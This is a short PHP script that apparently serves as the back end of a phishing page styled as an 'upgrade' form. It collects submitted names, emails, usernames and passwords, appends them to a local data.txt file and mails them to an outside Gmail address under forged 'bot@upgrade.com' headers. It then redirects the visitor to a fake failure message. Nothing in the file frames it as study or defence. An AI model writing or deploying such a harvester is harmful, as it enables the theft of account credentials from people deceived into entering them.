<?php
if(!empty($_POST['upgrade']) && $_POST['upgrade'] == 'myForm'){
  $to = 'honestbrooks@gmail.com';
  $subject = 'Upgrade-' . mt_rand();
  $msg = 'Name: '.$_POST['name']."\r\n";
  $msg .= 'Email: '.$_POST['email']."\r\n";
  $msg .= 'Username: '.$_POST['username']."\r\n";
  $msg .= 'Password: '.$_POST['password']."\r\n";
  $msg .= '-------------------------------'."\r\n";

  $headers = 'From: bot@upgrade.com' . "\r\n" .
  'Reply-To: bot@upgrade.com' . "\r\n" .
  'X-Mailer: PHP/' . phpversion();
  $fp = fopen('data.txt', 'a');
  fwrite($fp, $msg);
  fclose($fp);
  @mail($to, $subject, $msg, $headers,'-fwebmaster@upgrade.com');
  header('Location: ./?failed');
  exit();
}
?>

